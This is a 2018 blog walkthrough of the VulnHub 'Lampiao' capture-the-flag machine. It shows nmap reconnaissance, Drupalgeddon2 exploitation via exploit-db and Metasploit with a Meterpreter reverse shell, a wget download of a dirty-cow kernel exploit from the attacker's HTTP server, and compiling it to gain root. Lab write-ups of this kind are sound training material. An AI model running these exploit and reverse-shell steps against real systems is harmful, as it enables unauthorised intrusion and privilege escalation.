---
layout: post-detail
title: Walkthrough on the CTF lampiao
date: 2018-10-01
categories: CTF
description: CTF on lampiao, iso : https://www.vulnhub.com/entry/lampiao-1,249/
img-url: ''
comments: true
---

# Iso

Download the iso here: https://www.vulnhub.com/entry/lampiao-1,249/

# Discover the target

    $ sudo nmap -sS 192.168.2.0/24

```txt
Nmap scan report for 192.168.2.118
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:E1:ED:D5 (Oracle VirtualBox virtual NIC)
```

192.168.2.118 is our target, a ssh and a http server run.

# More informations

    $ sudo nmap -sT -sV -A -p- 192.168.2.118

```txt
22/tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)
- - -
1898/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Lampi\xC3\xA3o
```

The /CHANGELOG.txt show us the version of drupal 7.54

    $ searchsploit drupal

```txt
Drupal < 7.58 / < | exploits/php/webapps/44449.rb
```

We launch the exploit.

    $ ruby /usr/share/exploitdb/exploits/php/webapps/44449.rb http://192.168.2.118:1898

```txt
[*] --==[::#Drupalggedon2::]==--
--------------------------------------------------------------------------------
[*] Target : http://192.168.2.118:1898/
--------------------------------------------------------------------------------
[+] Found  : http://192.168.2.118:1898/CHANGELOG.txt (200)
[+] Drupal!: 7.54
--------------------------------------------------------------------------------
[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!
--------------------------------------------------------------------------------
[*] Fake shell:   curl 'http://192.168.2.118:1898/s.php' -d 'c=whoami'
lampiao>>
```

Unfortunately, the shell is very limited, try run g++ return:

    lampiao>> g++
    sh: 1: g: not found

Or `chmod +x something`, we cannot use any special character.
We'll run the same exploit under `metasploit` and `meterpreter`.

    $ msfconsole
    use exploit/unix/webapp/drupal_drupalgeddon2
    set RHOST 192.168.2.118
    set RPORT 1898
    exploit

```txt
[*] Started reverse TCP handler on 192.168.2.92:1898 
[*] Drupal 7 targeted at http://192.168.2.118:1898/
[+] Drupal appears unpatched in CHANGELOG.txt
[*] Sending stage (37775 bytes) to 192.168.2.118
[*] Meterpreter session 1 opened (192.168.2.92:1898 -> 192.168.2.118:36346) at 2018-10-01 15:46:15 +0200
meterpreter >
```

    meterpreter > shell
    python -c 'import pty;pty.spawn("/bin/bash")'
    lampiao:/var/www/html$ uname -a
    Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux

Back on my machine to research a nice exploit, i've try:

    $ searchsploit linux 4.4

```txt
43418.c
39166.c
37292.c
42276.c
37088.c
9542.c
41458.c
39277.c
40003.c
44298.c
44300.c
```

After a few hours to test no working exploit, i've test an another query on exploitdb:

    $ searchsploit Linux Kernel | grep local | wc -l
    200

Try to reduce the list, only `.c` and `.cpp` exploit.

    $ searchsploit Linux Kernel | grep local | grep -e "\.cpp$" -e "\.c$" | wc -l
    151

We remove `x86_64` and `arm` exploit.
     
    $ searchsploit Linux Kernel linux/local | grep -e "\.cpp$" -e "\.c$" | wc -l
    126

The list is again huge... after some times, the exploit `40847.cpp` has work...

```txt
Linux Kernel 2.6.22 < 3.9 | exploits/linux/local/40847.cpp
```

Yep, an exploit for `kernel 2.6.2 < 3.9` has work on a `kernel 4.4.0`.  
It must be 'the message' of this vm, never give up !

Start a server to download file under the lampiao vm.

    $ python2.7 -m SimpleHTTPServer 4444

    lampiao$ wget http://192.168.2.92:4444/40847.cpp

Instruction to compile are in the file:

    lampiao$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
    lampiao$ ./dcow -s

We are finally root:

    root@lampiao:~# cd
    root@lampiao:~# cat flag.txt
    9740616875908d91ddcdaa8aea3af366

Find the good exploit here was a bit long.
